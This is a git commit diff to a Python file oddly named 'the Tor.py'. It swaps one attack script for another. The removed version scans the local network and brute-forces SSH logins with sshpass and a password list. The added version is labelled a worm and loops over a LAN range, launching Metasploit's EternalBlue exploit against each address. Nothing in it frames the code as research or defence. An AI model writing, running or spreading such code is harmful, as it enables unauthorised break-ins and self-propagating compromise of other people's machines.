34c4907742ca4a0831966c55e4c3887ec61241ef
vIPERexe2 <148722243+vIPERexe2@users.noreply.github.com>
2023-11-08 15:19:52 +0200

    Update the Tor.py

--- the Tor.py
+++ the Tor.py
@@ -1,39 +1,25 @@
 import os
 import subprocess
 
-def scan_network():
-    # Perform a LAN scan to discover active devices
-    scan_result = subprocess.check_output(['arp', '-a']).decode('utf-8')
-    devices = []
-    
-    # Extract IP addresses from the scan result
-    for line in scan_result.splitlines():
-        if 'ether' in line:
-            ip_address = line.split('(')[1].split(')')[0]
-            devices.append(ip_address)
-    
-    return devices
+def spread_worm():
+    # Get the IP range of the LAN
+    ip_range = input("Enter the IP range of the LAN (e.g., 192.168.0.0/24): ")
 
-def brute_force_passwords(devices, password_file):
-    # Iterate through the list of devices
-    for device in devices:
-        # Try each password from the password file
-        with open(password_file, 'r') as file:
-            for password in file:
-                password = password.strip()
-                command = f'sshpass -p {password} ssh user@{device} -o ConnectTimeout=1'
-                
-                # Attempt to connect to the device using SSH
-                result = os.system(command)
-                
-                # If the connection is successful, print the password and exit
-                if result == 0:
-                    print(f'Password found: {password}')
-                    return
-    
-    print('Password not found')
+    # Generate a list of IP addresses in the LAN
+    ip_list = []
+    for i in range(1, 255):
+        ip = ip_range[:-4] + str(i)
+        ip_list.append(ip)
 
-# Usage
-devices = scan_network()
-password_file = 'passwords.txt'
-brute_force_passwords(devices, password_file)
+    # Spread the worm to each IP address in the LAN
+    for ip in ip_list:
+        try:
+            # Use Metasploit to exploit the target device
+            exploit_command = f"msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {ip}; exploit'"
+            subprocess.run(exploit_command, shell=True, check=True)
+            print(f"Worm successfully spread to {ip}")
+        except subprocess.CalledProcessError:
+            print(f"Failed to spread worm to {ip}")
+
+if __name__ == "__main__":
+    spread_worm()
